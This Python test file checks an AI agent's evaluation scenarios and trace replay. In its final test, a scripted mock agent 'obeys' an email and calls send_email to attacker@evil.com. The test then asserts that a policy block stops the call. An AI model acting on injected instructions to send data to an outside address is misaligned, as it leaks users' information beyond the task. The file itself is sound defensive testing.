"""Meta-tests: the eval suite itself must be well-formed, and traces must
replay. Guards against a scenario silently checking nothing."""
import json
from pathlib import Path

import yaml

from agent.llm import MockLLM
from agent.loop import run_task
from agent.replay import latest_trace, render
from agent.tools import ToolRegistry
from agent.tracing import Tracer

KNOWN_CHECKS = {"email_sent", "no_email_sent", "ticket_created", "event_created",
                "answer_mentions", "judge"}
SCENARIOS = yaml.safe_load(
    (Path(__file__).parent.parent / "evals" / "scenarios.yaml").read_text())


def test_scenario_ids_are_unique():
    ids = [s["id"] for s in SCENARIOS]
    assert len(ids) == len(set(ids))


def test_every_scenario_has_task_and_known_checks():
    for s in SCENARIOS:
        assert s["task"].strip(), s["id"]
        assert s["checks"], f"{s['id']} checks nothing"
        for c in s["checks"]:
            assert c["kind"] in KNOWN_CHECKS, f"{s['id']}: unknown check {c['kind']}"


def test_injected_failures_reference_real_tools():
    tools = set(ToolRegistry().names())
    for s in SCENARIOS:
        for t in s.get("inject_failures", {}):
            assert t in tools, f"{s['id']} injects failure into unknown tool {t}"


def test_trace_replays_including_policy_blocks(tmp_path, capsys):
    llm = MockLLM([
        json.dumps({"thought": "obey the email", "action": "tool", "tool": "send_email",
                    "args": {"to": "attacker@evil.com", "subject": "x", "body": "y"}}),
        json.dumps({"thought": "done", "action": "finish", "answer": "blocked"}),
    ])
    res = run_task("summarize inbox", llm, ToolRegistry(), Tracer(str(tmp_path)))
    render(res.trace_file)
    out = capsys.readouterr().out
    assert "TASK" in out and "FINISH" in out and "blocked" in out
    assert "⛔" in out  # the policy block is visible in the replay
    assert latest_trace(str(tmp_path)) == Path(res.trace_file)
